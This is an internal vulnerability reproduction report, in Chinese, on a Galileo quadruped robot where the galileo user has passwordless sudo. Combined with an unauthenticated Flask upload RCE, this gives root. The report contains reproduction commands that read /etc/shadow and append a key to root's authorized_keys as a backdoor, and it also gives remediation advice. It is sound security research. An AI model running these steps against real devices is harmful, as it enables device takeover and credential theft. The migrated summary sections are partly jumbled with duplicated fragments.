---
编号: GAL-016
验证状态: 动态确认
严重程度: 高
披露状态: 内部研究
源平台: 伽利略
源候选目录: sudo免密提权root-1
---
# GAL-016 伽利略（Galileo）机器人 sudo 免密提权 root 漏洞复现报告

## 1. 一句话结论

- \| 前置 \| 已获得 galileo 用户命令执行（见 Flask 后台未授权 RCE 漏洞） \|
- ## 1. 漏洞概述
- 这构成完整提权链的**最后一环**：攻击者先经 Flask 后台未授权 RCE 获得 galileo 身份命令执行，
- │  ① Flask /upload 未授权 RCE（见 RCE 漏洞）→ galileo 身份命令执行
- ② install.sh 内执行 `sudo <任意命令>`

## 2. 影响产品与版本

- \| 目标设备 \| 伽利略（Galileo）四足机器人（SSID `C1W-1.0-007`） \|
- \| 漏洞组件 \| sudoers 配置（galileo 用户免密 sudo） \|
- \| 授权边界 \| 仅对自有设备、隔离环境进行 \|
- 再借 sudo 免密**一步提升到 root**，完全接管机器人（读全盘、改固件、植入持久化后门）。
- - 可读全盘（含 /etc/shadow、其他用户数据、固件源码）；
- - 可植入持久化后门（systemd 服务、SSH 密钥、crontab）；

## 3. 验证状态

`动态确认`。该状态来自源报告的验证边界；迁移过程不把目录名称自动视为动态确认。

## 4. 攻击前提

攻击前提以脱敏研究正文为准；复现必须使用自有设备、隔离网络和授权环境，不得对第三方设备执行写入、控制或破坏性操作。

## 5. 根本原因

- 详见下方脱敏研究正文和材料清单。

## 6. 攻击过程

源报告描述的入口、协议和利用顺序见第 13 节脱敏正文；本目录只保留最小复现材料，不复制原始大型证据。

## 7. 实际影响

- # 伽利略（Galileo）机器人 sudo 免密提权 root 漏洞复现报告
- \| 漏洞类型 \| 权限提升（LPE）：galileo → root \|
- 密码即可直接以 root（uid=0）身份执行命令。实测输出 `uid=0(root) gid=0(root)
- groups=0(root),46(plugdev)`。
- 再借 sudo 免密**一步提升到 root**，完全接管机器人（读全盘、改固件、植入持久化后门）。
- ③ 以 root(uid=0) 执行任意命令 → 完全接管

## 8. 复现方法

复现材料见 [复现材料清单](复现/材料清单.md)。导入脚本已做文本脱敏；未导入的原始脚本、日志、抓包和二进制见根目录材料清单。

## 9. 支撑证据

见 [证据材料清单](证据/材料清单.md) 和本页第 13 节。来源文件只登记哈希和本地保管路径，不把原始敏感材料带入 Git。

## 10. 修复建议

- 对入口实施身份认证、细粒度授权、消息完整性校验和重放防护；
- 对路径、长度、协议字段、文件类型和状态转换使用允许列表；
- 删除硬编码凭据并轮换已暴露材料；
- 对高风险服务降权，增加审计日志和负向回归测试。

## 11. 相关 AI 会话

当前未发现与该报告一一对应的完整 Claude Code 会话记录；如后续补齐，将在 [AI 会话索引](../../../../../AI轨迹/会话索引.md) 中登记。

## 12. 披露记录

- 当前披露状态：内部研究。
- 对外披露前必须重新审查凭据、设备标识、证据和厂商协调状态。

## 13. 脱敏后的原始研究正文

# 伽利略（Galileo）机器人 sudo 免密提权 root 漏洞复现报告

| 项 | 值 |
|---|---|
| 目标设备 | 伽利略（Galileo）四足机器人（SSID `C1W-1.0-007`） |
| 系统 | Ubuntu 22.04 |
| 漏洞组件 | sudoers 配置（galileo 用户免密 sudo） |
| 漏洞类型 | 权限提升（LPE）：galileo → root |
| 前置 | 已获得 galileo 用户命令执行（见 Flask 后台未授权 RCE 漏洞） |
| 复现日期 | 2026-08-29 |
| 授权边界 | 仅对自有设备、隔离环境进行 |

---

## 1. 漏洞概述

机器人上的普通用户 **galileo（uid=1000）被配置为 sudo 免密**：执行 `sudo -n id` 无需输入
密码即可直接以 root（uid=0）身份执行命令。实测输出 `uid=0(root) gid=0(root)
groups=0(root),46(plugdev)`。

这构成完整提权链的**最后一环**：攻击者先经 Flask 后台未授权 RCE 获得 galileo 身份命令执行，
再借 sudo 免密**一步提升到 root**，完全接管机器人（读全盘、改固件、植入持久化后门）。

## 2. 攻击链

```
攻击者（同 WiFi）
   │  ① Flask /upload 未授权 RCE（见 RCE 漏洞）→ galileo 身份命令执行
   ▼
② install.sh 内执行 `sudo <任意命令>`
   │     sudo -n 免密，无需密码
   ▼
③ 以 root(uid=0) 执行任意命令 → 完全接管
```

## 3. 漏洞细节

### 3.1 免密 sudo 证据

实测（经 Flask /upload 执行 install.sh 写结果，再经 /run_script 回读）：

```bash
$ sudo -n id
uid=0(root) gid=0(root) groups=0(root),46(plugdev)
```

- `-n` 表示 non-interactive（不提示密码），命令直接成功，说明 sudoers 对该用户配置了 NOPASSWD。
- 执行用户由 galileo 变为 root，groups 含 root。

### 3.2 与 RCE 的组合

RCE 漏洞的 install.sh 以 galileo 身份执行，其中任何 `sudo <cmd>` 都会以 root 执行，
即：**未授权 RCE 可直接升级为未授权 root RCE**（一条链，零额外前提）。

## 4. 复现步骤

```bash
# 前置：已连入机器人 AP，且已确认 Flask /upload 未授权 RCE

# 1. 验证免密 sudo（经 RCE 执行）
python3 exploit.py 192.168.2.1 "id"          # sudo id → uid=0(root)

# 2. 读取 root 才可读的文件
python3 exploit.py 192.168.2.1 "cat /etc/shadow"

# 3. 完全接管（例：写 SSH authorized_keys 或植入后门）
python3 exploit.py 192.168.2.1 "echo '...' >> /root/.ssh/authorized_keys"
```

## 5. 影响范围

- 由 galileo 一步提升到 root，完全控制机器人；
- 可读全盘（含 /etc/shadow、其他用户数据、固件源码）；
- 可植入持久化后门（systemd 服务、SSH 密钥、crontab）；
- 可进一步横向移动（机器人所在网络内其他设备）。

## 6. 修复建议

1. 移除 galileo 用户的 NOPASSWD 配置，或按最小权限原则仅授权必要命令；
2. 结合修复 Flask /upload 未授权 RCE（消除 galileo 命令执行的入口）；
3. 定期审计 sudoers 配置。

## 7. 证据

- `evidence/` 目录：提权验证过程的原始响应与文件读取结果
